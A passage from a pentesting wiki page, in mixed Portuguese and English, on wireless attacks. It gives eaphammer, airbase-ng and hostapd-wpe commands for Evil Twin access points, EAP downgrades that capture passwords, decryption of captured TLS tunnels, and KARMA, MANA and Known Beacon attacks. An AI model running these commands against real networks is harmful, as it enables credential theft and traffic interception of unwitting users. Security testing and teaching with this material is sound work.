You can create a very basic Open Evil Twin (no capabilities to route traffic to Internet) doing:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Você também pode criar um Evil Twin usando **eaphammer** (observe que para criar evil twins com eaphammer a interface **NÃO deve estar** em **monitor** mode):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Ou usando Airgeddon: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

Por favor, note que por padrão, se um ESSID na PNL estiver salvo como protegido por WPA, o dispositivo não vai se conectar automaticamente a um Open evil Twin. Você pode tentar dar DoS no AP real e esperar que o usuário conecte manualmente ao seu Open evil Twin, ou pode dar DoS no AP real e usar um WPA Evil Twin para capturar o handshake (usando este método você não poderá permitir que a vítima se conecte a você, pois você não conhece o PSK, mas pode capturar o handshake e tentar cracká-lo).

_Alguns OS e AV vão alertar o usuário que conectar-se a uma Open network é perigoso..._

### WPA/WPA2 Evil Twin

Você pode criar um **Evil Twin using WPA/2** e, se os dispositivos estiverem configurados para conectar-se a esse SSID com WPA/2, eles vão tentar se conectar. De qualquer forma, **to complete the 4-way-handshake** você também precisa **saber** a **senha** que o cliente vai usar. Se você **não a souber**, a **conexão não será completada**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Para entender estes ataques, recomendo ler antes a breve [WPA Enterprise explanation](#wpa-enterprise-mgt).

**Usando hostapd-wpe**

`hostapd-wpe` precisa de um arquivo de **configuração** para funcionar. Para **automatizar** a geração dessas configurações, você pode usar [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) (faça o download do arquivo python dentro de _/etc/hostapd-wpe_)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
No arquivo de configuração você pode selecionar muitas coisas diferentes, como ssid, channel, user files, cert/key, dh parameters, wpa version e auth...

[**Using hostapd-wpe with EAP-TLS to allow any certificate to login.**](evil-twin-eap-tls.md)

**Using EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Por padrão, EAPHammer utiliza estes métodos de autenticação (observe GTC como o primeiro a tentar obter senhas plaintext e depois o uso de métodos de autenticação mais robustos):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Esta é a metodologia padrão para evitar longos tempos de conexão. No entanto, você também pode especificar ao server os métodos de autenticação do mais fraco ao mais forte:
```
--negotiate weakest
```
Ou você também pode usar:

- `--negotiate gtc-downgrade` para usar uma implementação de downgrade GTC altamente eficiente (plaintext passwords)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` para especificar manualmente os métodos oferecidos (oferecendo os mesmos auth methods na mesma ordem da organização, o ataque será muito mais difícil de detectar).
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Using Airgeddon**

`Airgeddon` pode usar certificados previamente gerados para oferecer autenticação EAP a redes WPA/WPA2-Enterprise. A rede falsa rebaixará o protocolo de conexão para EAP-MD5, então ela será capaz de **capturar o usuário e o MD5 da senha**. Mais tarde, o atacante pode tentar quebrar a senha.\
`Airggedon` oferece a possibilidade de um **continuous Evil Twin attack (noisy)** ou **only create the Evil Attack until someone connects (smooth).**

![](<../../images/image (936).png>)

### Debugging PEAP and EAP-TTLS TLS tunnels in Evil Twins attacks

_Este método foi testado em uma conexão PEAP, mas como eu estou descriptografando um túnel TLS arbitrário isso também deve funcionar com EAP-TTLS_

Dentro da **configuração** do _hostapd-wpe_ **comente** a linha que contém _**dh_file**_ (from `dh_file=/etc/hostapd-wpe/certs/dh` to `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Isto fará com que `hostapd-wpe` **exchange keys using RSA** em vez de DH, assim você poderá **decrypt** o tráfego mais tarde **knowing the servers private key**.

Now start the **Evil Twin** using **`hostapd-wpe`** with that modified configuration as usual. Also, start **`wireshark`** in the **interface** which is performing the Evil Twin attack.

Now or later (when you have already captured some authentication intents) you can add the private RSA key to wireshark in: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Add a new entry and fill the form with this values: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**select your key file**, to avoid problems select a key file **without being password protected**).

![](<../../images/image (687).png>)

And look at the new **"Decrypted TLS" tab**:

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA and Known beacons attack

### ESSID and MAC black/whitelists

Different types of Media Access Control Filter Lists (MFACLs) and their corresponding modes and effects on the behavior of a rogue Access Point (AP):

1. **MAC-based Whitelist**:
- The rogue AP will respond only to probe requests from devices specified in the whitelist, remaining invisible to all others not listed.
2. **MAC-based Blacklist**:
- The rogue AP will ignore probe requests from devices on the blacklist, effectively making the rogue AP invisible to those specific devices.
3. **SSID-based Whitelist**:
- The rogue AP will respond to probe requests only for specific ESSIDs listed, making it invisible to devices whose Preferred Network Lists (PNLs) do not contain those ESSIDs.
4. **SSID-based Blacklist**:
- The rogue AP will not respond to probe requests for the specific ESSIDs on the blacklist, making it invisible to devices seeking those particular networks.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Este método permite que um **attacker crie um access point (AP) malicioso que responde a todas as probe requests** de dispositivos que procuram conectar-se a redes. Esta técnica **engana os dispositivos fazendo-os conectar ao attacker's AP** ao imitar as redes que os dispositivos estão procurando. Quando um dispositivo envia um pedido de conexão para este rogue AP, a conexão é completada, levando o dispositivo a conectar-se equivocadamente à rede do attacker.

### MANA

Depois, os dispositivos passaram a ignorar respostas de rede não confiáveis, reduzindo a eficácia do ataque karma original. Contudo, um novo método, conhecido como **MANA attack**, foi apresentado por Ian de Villiers e Dominic White. Este método envolve o rogue AP **capturing the Preferred Network Lists (PNL) from devices by responding to their broadcast probe requests** com nomes de rede (SSIDs) previamente armazenados nos dispositivos. Este ataque sofisticado contorna as proteções contra o ataque karma original ao explorar a forma como os dispositivos lembram e priorizam redes conhecidas.

O MANA attack opera monitorando tanto directed quanto broadcast probe requests dos dispositivos. Para directed requests, ele registra o MAC address do dispositivo e o nome de rede solicitado, adicionando essa informação a uma lista. Quando um broadcast request é recebido, o AP responde com informações que correspondem a qualquer uma das redes na lista do dispositivo, atraindo o dispositivo a conectar-se ao rogue AP.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

A **Loud MANA attack** é uma estratégia avançada para quando dispositivos não usam directed probing ou quando suas Preferred Network Lists (PNL) são desconhecidas pelo atacante. Opera sob o princípio de que **dispositivos na mesma área provavelmente compartilham alguns nomes de rede em seus PNLs**. Em vez de responder seletivamente, este ataque faz broadcasts de probe responses para cada nome de rede (ESSID) encontrado nas PNLs combinadas de todos os dispositivos observados. Essa abordagem ampla aumenta a chance de um dispositivo reconhecer uma rede familiar e tentar se conectar ao rogue Access Point (AP).
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Quando o **Loud MANA attack** pode não ser suficiente, o **Known Beacon attack** apresenta outra abordagem. Este método **força bruta o processo de conexão simulando um AP que responde a qualquer nome de rede, percorrendo uma lista de ESSIDs potenciais** derivada de uma wordlist. Isso simula a presença de inúmeras redes, na esperança de corresponder um ESSID presente no PNL da vítima, provocando uma tentativa de conexão ao AP fabricado. O ataque pode ser ampliado combinando-o com a opção `--loud` para uma tentativa mais agressiva de capturar dispositivos.

Eaphammer implementou esse ataque como um MANA attack onde todos os ESSIDs dentro de uma lista são anunciados (você também poderia combinar isso com `--loud` para criar um Loud MANA + Known beacons attack):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

A **Known Beacon Burst attack** envolve **rapid-fire broadcasting of beacon frames for each ESSID listed in a file**. Isso cria um ambiente denso de redes falsas, aumentando muito a probabilidade de que dispositivos se conectem ao rogue AP, especialmente quando combinado com um MANA attack. Esta técnica tira proveito da velocidade e do volume para sobrecarregar os mecanismos de seleção de rede dos dispositivos.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** é um protocolo que permite que dispositivos se conectem diretamente entre si usando Wi-Fi sem a necessidade de um ponto de acesso wireless tradicional. Essa capacidade está integrada em vários dispositivos Internet of Things (IoT), como impressoras e televisores, facilitando a comunicação direta device-to-device. Uma característica notável do Wi-Fi Direct é que um dispositivo assume o papel de access point, conhecido como group owner, para gerenciar a conexão.

A segurança das conexões Wi-Fi Direct é estabelecida através do **Wi-Fi Protected Setup (WPS)**, que suporta vários métodos de pareamento seguro, incluindo:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

Esses métodos, particularmente o PIN entry, são suscetíveis às mesmas vulnerabilidades do WPS em redes Wi-Fi tradicionais, tornando-os alvos para vetores de ataque semelhantes.

### EvilDirect Hijacking

**EvilDirect Hijacking** é um ataque específico ao Wi-Fi Direct. Ele espelha o conceito de um ataque Evil Twin, mas foca em conexões Wi-Fi Direct. Nesse cenário, um atacante se faz passar por um group owner legítimo com o objetivo de enganar dispositivos para que se conectem a uma entidade maliciosa. Esse método pode ser executado usando ferramentas como `airbase-ng`, especificando o channel, ESSID, e MAC address do dispositivo impersonado:

## References

- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)


TODO: Dê uma olhada em [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (login com facebook e imitação de WPA em captive portals)

{{#include ../../banners/hacktricks-training.md}}
